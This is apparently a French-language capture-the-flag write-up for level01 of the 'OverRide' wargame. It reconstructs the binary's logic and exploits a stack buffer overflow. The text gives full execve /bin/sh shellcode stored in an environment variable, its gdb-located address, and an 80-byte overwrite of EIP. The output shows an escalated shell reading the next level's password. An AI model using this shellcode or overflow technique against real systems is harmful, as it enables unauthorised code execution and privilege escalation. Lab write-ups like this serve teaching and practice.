Ici on voit en reconstruisant le code en C que sa ne sert a rien de le suivre car le user et le mot de passe ne servent a rien et il n'y a pas bash qui est appelé dans le code donc on va devoir injecter notre shellcode.

On le place dans une variables d'envrionnement.

```bash
level01@OverRide:~$ export SC=$(python -c "print('\x90' * 42 + '\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x68\x2f\x73\x68\x31\x80\x74\x24\x03\x31\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80')")
```

En cherchant on voit qu'il y a un buffer de 68 (0x60 - 0x1c). En additionnant avec les registre il va falloir ecrire 80 octets pour avoir acces a EIP et l'override avec l'adresse de notre shellcode.

```gdb
(gdb) x/20s *((char **)environ)
...
...
0xffffdea7:	 "SC=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\322\061\333\061\311h/sh1\200t$\003\061h/bin\211\343RS\211\341\260\v̀"
...
...
```

```bash
level01@OverRide:~$ cat <(python -c "print 'dat_wil' + '\n' + 'A' * 80 + '\xa7\xde\xff\xff'") - | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

id
uid=1001(level01) gid=1001(level01) euid=1002(level02) egid=100(users) groups=1002(level02),100(users),1001(level01)
cat /home/user/level02/.pass
cat: /home/user/level02/.pass: No such file or directory
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```